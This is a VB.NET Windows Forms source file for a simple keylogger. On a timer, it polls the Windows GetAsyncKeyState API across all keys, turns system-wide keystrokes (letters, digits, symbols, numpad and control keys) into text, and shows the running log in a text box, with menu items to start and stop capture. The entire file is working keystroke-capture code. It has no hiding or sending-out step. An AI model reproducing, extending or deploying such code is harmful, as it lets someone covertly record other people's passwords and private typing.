Imports System.Runtime.InteropServices
Public Class Form1

    Public Declare Function GetAsyncKeyState Lib "user32" Alias "GetAsyncKeyState" (ByVal vKey As Integer) As Integer

    Dim log As String

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If My.Computer.Keyboard.ShiftKeyDown Then
            If (GetAsyncKeyState(192)) Then
                log = log + "~"
            ElseIf (GetAsyncKeyState(189)) Then
                log = log + "_"
            ElseIf (GetAsyncKeyState(187)) Then
                log = log + "+"
            ElseIf (GetAsyncKeyState(219)) Then
                log = log + "{"
            ElseIf (GetAsyncKeyState(221)) Then
                log = log + "}"
            ElseIf (GetAsyncKeyState(186)) Then
                log = log + ":"
            ElseIf (GetAsyncKeyState(222)) Then
                log = log + """"
            ElseIf (GetAsyncKeyState(220)) Then
                log = log + "|"
            ElseIf (GetAsyncKeyState(188)) Then
                log = log + "<"
            ElseIf (GetAsyncKeyState(190)) Then
                log = log + ">"
            ElseIf (GetAsyncKeyState(191)) Then
                log = log + "?"
            ElseIf (GetAsyncKeyState(48)) Then
                log = log + ")"
            ElseIf (GetAsyncKeyState(49)) Then
                log = log + "!"
            ElseIf (GetAsyncKeyState(50)) Then
                log = log + "@"
            ElseIf (GetAsyncKeyState(51)) Then
                log = log + "#"
            ElseIf (GetAsyncKeyState(52)) Then
                log = log + "$"
            ElseIf (GetAsyncKeyState(53)) Then
                log = log + "%"
            ElseIf (GetAsyncKeyState(54)) Then
                log = log + "^"
            ElseIf (GetAsyncKeyState(55)) Then
                log = log + "&"
            ElseIf (GetAsyncKeyState(56)) Then
                log = log + "*"
            ElseIf (GetAsyncKeyState(57)) Then
                log = log + "("
            ElseIf (GetAsyncKeyState(65)) Then
                log = log + "A"
            ElseIf (GetAsyncKeyState(66)) Then
                log = log + "B"
            ElseIf (GetAsyncKeyState(67)) Then
                log = log + "C"
            ElseIf (GetAsyncKeyState(68)) Then
                log = log + "D"
            ElseIf (GetAsyncKeyState(69)) Then
                log = log + "E"
            ElseIf (GetAsyncKeyState(70)) Then
                log = log + "F"
            ElseIf (GetAsyncKeyState(71)) Then
                log = log + "G"
            ElseIf (GetAsyncKeyState(72)) Then
                log = log + "H"
            ElseIf (GetAsyncKeyState(73)) Then
                log = log + "I"
            ElseIf (GetAsyncKeyState(74)) Then
                log = log + "J"
            ElseIf (GetAsyncKeyState(75)) Then
                log = log + "K"
            ElseIf (GetAsyncKeyState(76)) Then
                log = log + "L"
            ElseIf (GetAsyncKeyState(77)) Then
                log = log + "M"
            ElseIf (GetAsyncKeyState(78)) Then
                log = log + "N"
            ElseIf (GetAsyncKeyState(79)) Then
                log = log + "O"
            ElseIf (GetAsyncKeyState(80)) Then
                log = log + "P"
            ElseIf (GetAsyncKeyState(81)) Then
                log = log + "Q"
            ElseIf (GetAsyncKeyState(82)) Then
                log = log + "R"
            ElseIf (GetAsyncKeyState(83)) Then
                log = log + "S"
            ElseIf (GetAsyncKeyState(84)) Then
                log = log + "T"
            ElseIf (GetAsyncKeyState(85)) Then
                log = log + "U"
            ElseIf (GetAsyncKeyState(86)) Then
                log = log + "V"
            ElseIf (GetAsyncKeyState(87)) Then
                log = log + "W"
            ElseIf (GetAsyncKeyState(88)) Then
                log = log + "X"
            ElseIf (GetAsyncKeyState(89)) Then
                log = log + "Y"
            ElseIf (GetAsyncKeyState(90)) Then
                log = log + "Z"
            End If
        ElseIf My.Computer.Keyboard.CapsLock Then
            If (GetAsyncKeyState(65)) Then
                log = log + "A"
            ElseIf (GetAsyncKeyState(66)) Then
                log = log + "B"
            ElseIf (GetAsyncKeyState(67)) Then
                log = log + "C"
            ElseIf (GetAsyncKeyState(68)) Then
                log = log + "D"
            ElseIf (GetAsyncKeyState(69)) Then
                log = log + "E"
            ElseIf (GetAsyncKeyState(70)) Then
                log = log + "F"
            ElseIf (GetAsyncKeyState(71)) Then
                log = log + "G"
            ElseIf (GetAsyncKeyState(72)) Then
                log = log + "H"
            ElseIf (GetAsyncKeyState(73)) Then
                log = log + "I"
            ElseIf (GetAsyncKeyState(74)) Then
                log = log + "J"
            ElseIf (GetAsyncKeyState(75)) Then
                log = log + "K"
            ElseIf (GetAsyncKeyState(76)) Then
                log = log + "L"
            ElseIf (GetAsyncKeyState(77)) Then
                log = log + "M"
            ElseIf (GetAsyncKeyState(78)) Then
                log = log + "N"
            ElseIf (GetAsyncKeyState(79)) Then
                log = log + "O"
            ElseIf (GetAsyncKeyState(80)) Then
                log = log + "P"
            ElseIf (GetAsyncKeyState(81)) Then
                log = log + "Q"
            ElseIf (GetAsyncKeyState(82)) Then
                log = log + "R"
            ElseIf (GetAsyncKeyState(83)) Then
                log = log + "S"
            ElseIf (GetAsyncKeyState(84)) Then
                log = log + "T"
            ElseIf (GetAsyncKeyState(85)) Then
                log = log + "U"
            ElseIf (GetAsyncKeyState(86)) Then
                log = log + "V"
            ElseIf (GetAsyncKeyState(87)) Then
                log = log + "W"
            ElseIf (GetAsyncKeyState(88)) Then
                log = log + "X"
            ElseIf (GetAsyncKeyState(89)) Then
                log = log + "Y"
            ElseIf (GetAsyncKeyState(90)) Then
                log = log + "Z"
            End If
        Else
            If (GetAsyncKeyState(65)) Then
                log = log + "a"
            ElseIf (GetAsyncKeyState(66)) Then
                log = log + "b"
            ElseIf (GetAsyncKeyState(67)) Then
                log = log + "c"
            ElseIf (GetAsyncKeyState(68)) Then
                log = log + "d"
            ElseIf (GetAsyncKeyState(69)) Then
                log = log + "e"
            ElseIf (GetAsyncKeyState(70)) Then
                log = log + "f"
            ElseIf (GetAsyncKeyState(71)) Then
                log = log + "g"
            ElseIf (GetAsyncKeyState(72)) Then
                log = log + "h"
            ElseIf (GetAsyncKeyState(73)) Then
                log = log + "i"
            ElseIf (GetAsyncKeyState(74)) Then
                log = log + "j"
            ElseIf (GetAsyncKeyState(75)) Then
                log = log + "k"
            ElseIf (GetAsyncKeyState(76)) Then
                log = log + "l"
            ElseIf (GetAsyncKeyState(77)) Then
                log = log + "m"
            ElseIf (GetAsyncKeyState(78)) Then
                log = log + "n"
            ElseIf (GetAsyncKeyState(79)) Then
                log = log + "o"
            ElseIf (GetAsyncKeyState(80)) Then
                log = log + "p"
            ElseIf (GetAsyncKeyState(81)) Then
                log = log + "q"
            ElseIf (GetAsyncKeyState(82)) Then
                log = log + "r"
            ElseIf (GetAsyncKeyState(83)) Then
                log = log + "s"
            ElseIf (GetAsyncKeyState(84)) Then
                log = log + "t"
            ElseIf (GetAsyncKeyState(85)) Then
                log = log + "u"
            ElseIf (GetAsyncKeyState(86)) Then
                log = log + "v"
            ElseIf (GetAsyncKeyState(87)) Then
                log = log + "w"
            ElseIf (GetAsyncKeyState(88)) Then
                log = log + "x"
            ElseIf (GetAsyncKeyState(89)) Then
                log = log + "y"
            ElseIf (GetAsyncKeyState(90)) Then
                log = log + "z"
            ElseIf (GetAsyncKeyState(48)) Then
                log = log + "0"
            ElseIf (GetAsyncKeyState(49)) Then
                log = log + "1"
            ElseIf (GetAsyncKeyState(50)) Then
                log = log + "2"
            ElseIf (GetAsyncKeyState(51)) Then
                log = log + "3"
            ElseIf (GetAsyncKeyState(52)) Then
                log = log + "4"
            ElseIf (GetAsyncKeyState(53)) Then
                log = log + "5"
            ElseIf (GetAsyncKeyState(54)) Then
                log = log + "6"
            ElseIf (GetAsyncKeyState(55)) Then
                log = log + "7"
            ElseIf (GetAsyncKeyState(56)) Then
                log = log + "8"
            ElseIf (GetAsyncKeyState(57)) Then
                log = log + "9"
            ElseIf (GetAsyncKeyState(96)) Then
                log = log + "{Num0}"
            ElseIf (GetAsyncKeyState(97)) Then
                log = log + "{Num1}"
            ElseIf (GetAsyncKeyState(98)) Then
                log = log + "{Num2}"
            ElseIf (GetAsyncKeyState(99)) Then
                log = log + "{Num3}"
            ElseIf (GetAsyncKeyState(100)) Then
                log = log + "{Num4}"
            ElseIf (GetAsyncKeyState(101)) Then
                log = log + "{Num5}"
            ElseIf (GetAsyncKeyState(102)) Then
                log = log + "{Num6}"
            ElseIf (GetAsyncKeyState(103)) Then
                log = log + "{Num7}"
            ElseIf (GetAsyncKeyState(104)) Then
                log = log + "{Num8}"
            ElseIf (GetAsyncKeyState(105)) Then
                log = log + "{Num9}"
            ElseIf (GetAsyncKeyState(106)) Then
                log = log + "{Num*}"
            ElseIf (GetAsyncKeyState(107)) Then
                log = log + "{Num+}"
            ElseIf (GetAsyncKeyState(13)) Then
                log = log + "{Enter}"
            ElseIf (GetAsyncKeyState(109)) Then
                log = log + "{Num-}"
            ElseIf (GetAsyncKeyState(110)) Then
                log = log + "{Num.}"
            ElseIf (GetAsyncKeyState(111)) Then
                log = log + "{Num/}"
            ElseIf (GetAsyncKeyState(32)) Then
                log = log + " "
            ElseIf (GetAsyncKeyState(8)) Then
                log = log + "{Backspace}"
            ElseIf (GetAsyncKeyState(9)) Then
                log = log + "{Tab}"
                'ElseIf (GetAsyncKeyState(16)) Then
                'log = log + "{Shift}"
            ElseIf (GetAsyncKeyState(17)) Then
                log = log + "{Control}"
            ElseIf (GetAsyncKeyState(27)) Then
                log = log + "{Esc}"
            ElseIf (GetAsyncKeyState(45)) Then
                log = log + "{Insert}"
            ElseIf (GetAsyncKeyState(46)) Then
                log = log + "{Del}"
            ElseIf (GetAsyncKeyState(144)) Then
                log = log + "{NumLock}"
            ElseIf (GetAsyncKeyState(192)) Then
                log = log + "`"
            ElseIf (GetAsyncKeyState(189)) Then
                log = log + "-"
            ElseIf (GetAsyncKeyState(187)) Then
                log = log + "="
            ElseIf (GetAsyncKeyState(219)) Then
                log = log + "["
            ElseIf (GetAsyncKeyState(221)) Then
                log = log + "]"
            ElseIf (GetAsyncKeyState(186)) Then
                log = log + ";"
            ElseIf (GetAsyncKeyState(222)) Then
                log = log + "'"
            ElseIf (GetAsyncKeyState(220)) Then
                log = log + "\"
            ElseIf (GetAsyncKeyState(188)) Then
                log = log + ","
            ElseIf (GetAsyncKeyState(190)) Then
                log = log + "."
            ElseIf (GetAsyncKeyState(191)) Then
                log = log + "/"
            End If
        End If
        TextBox1.Text = log
    End Sub

    Private Sub LogToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LogToolStripMenuItem.Click
        Timer1.Start()
        TextBox1.ForeColor = Color.White
    End Sub

    Private Sub StopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem1.Click
        Timer1.Stop()
        TextBox1.ForeColor = Color.Black
    End Sub

End Class
